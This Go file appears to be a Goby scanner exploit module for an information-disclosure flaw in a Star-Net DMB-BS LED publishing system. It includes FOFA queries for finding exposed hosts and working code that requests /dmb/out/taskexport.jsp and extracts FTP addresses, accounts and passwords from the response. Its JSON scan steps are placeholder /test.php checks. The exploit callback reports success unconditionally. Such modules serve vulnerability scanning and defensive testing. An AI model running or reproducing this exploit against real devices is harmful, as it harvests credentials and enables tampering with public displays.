package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
  "regexp"
)

func init() {
	expJson := `{
    "Name": "Star-Net-Sharp-internal-System /taskexport.jsp  Information Disclosure Vulnerability",
    "Description": "<p>Founded in 2000, Fujian Xingwang Ruijie Communication Co., Ltd. adheres to the business philosophy of \"integrating innovative technology to build a smart future\", and is a leading provider of ICT infrastructure and AI application solutions in China. </p><p>Attackers can read the FTP server address, port, account and password through this vulnerability, and tamper with the LED release information through FTP.taskexport.jsp</p>",
    "Product": "Star-Net-Sharp-internal-System",
    "Homepage": "https://www.star-net.cn/",
    "DisclosureDate": "2024-09-05",
    "PostTime": "2024-09-08",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/dmb/js/ext-ex/date/moment.js\" && body=\"/dmb/js/ext-ux.js\"",
    "GobyQuery": "body=\"/dmb/js/ext-ex/date/moment.js\" && body=\"/dmb/js/ext-ux.js\"",
    "Level": "0",
    "Impact": "<p>Attackers can read the FTP server address, port, account and password through this vulnerability, and tamper with the LED release information through FTP.taskexport.jsp</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.  </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "FTP configuration"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "4.0",
    "Translation": {
        "CN": {
            "Name": "星网锐捷 DMB-BS LED屏信息发布系统 /taskexport.jsp 信息泄露漏洞",
            "Product": "星网锐捷内部系统",
            "Description": "<p>福建星网锐捷通讯股份有限公司成立于2000年，公司秉承“融合创新科技，构建智慧未来\"的经营理念，是国内领先的ICT基础设施及AI应用方案提供商。</p><p>星网锐捷 DMB-BS LED屏信息发布系统/taskexport.jsp接口处存在敏感信息泄露，攻击者可以可以通过此漏洞读取 FTP 服务器地址、端口及账号密码，通过 FTP 可篡改 LED 发布信息。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>星网锐捷 DMB-BS LED屏信息发布系统/taskexport.jsp接口处存在敏感信息泄露，攻击者可以可以通过此漏洞读取 FTP 服务器地址、端口及账号密码，通过 FTP 可篡改 LED 发布信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Star-Net-Sharp-internal-System /taskexport.jsp  Information Disclosure Vulnerability",
            "Product": "Star-Net-Sharp-internal-System",
            "Description": "<p>Founded in 2000, Fujian Xingwang Ruijie Communication Co., Ltd. adheres to the business philosophy of \"integrating innovative technology to build a smart future\", and is a leading provider of ICT infrastructure and AI application solutions in China.&nbsp;</p><p>Attackers can read the FTP server address, port, account and password through this vulnerability, and tamper with the LED release information through FTP.taskexport.jsp<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can read the FTP server address, port, account and password through this vulnerability, and tamper with the LED release information through FTP.taskexport.jsp<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9953"
}`
	sendPayloadcnabikcbgaybhcsbhyacuayhhbsxgbvfhagtjgx := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：msg是返回的数据
		// 注意：vulInfo是请求路径
		vulInfo := `/dmb/out/taskexport.jsp?taskcode=`
		msg := ``
		requestConfig := httpclient.NewGetRequestConfig(vulInfo)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "rootpath") && strings.Contains(resp.RawBody, "pwd") {
        re, _ := regexp.Compile(`<ftp((.|\n)*?)/>`)
				if !re.MatchString(resp.RawBody) {
					//正则匹配不到输出全部文件内容
					return false, vulInfo, msg
				}
				match := re.FindStringSubmatch(resp.RawBody)
        tmpmsg := match[1]
        //将tmpmsg中的空格替换为换行符
        tmpmsg = strings.Replace(tmpmsg, " ", "\n", -1)
				msg := "FTP configuration: " + tmpmsg
				return true, vulInfo, msg
			}
		}
		return false, vulInfo, msg
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, _ := sendPayloadcnabikcbgaybhcsbhyacuayhhbsxgbvfhagtjgx(hostInfo)
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.HostInfo + vulInfo
				return true
			}
			return false
		},
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      // 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
  
      // --------------------------------------------------
      // 请注意，后续为模板内容，正常情况下无需修改
      _, _, vulPath := sendPayloadcnabikcbgaybhcsbhyacuayhhbsxgbvfhagtjgx(expResult.HostInfo)
      expResult.Output = vulPath
      expResult.Success = true
      return expResult
    },
	))
}
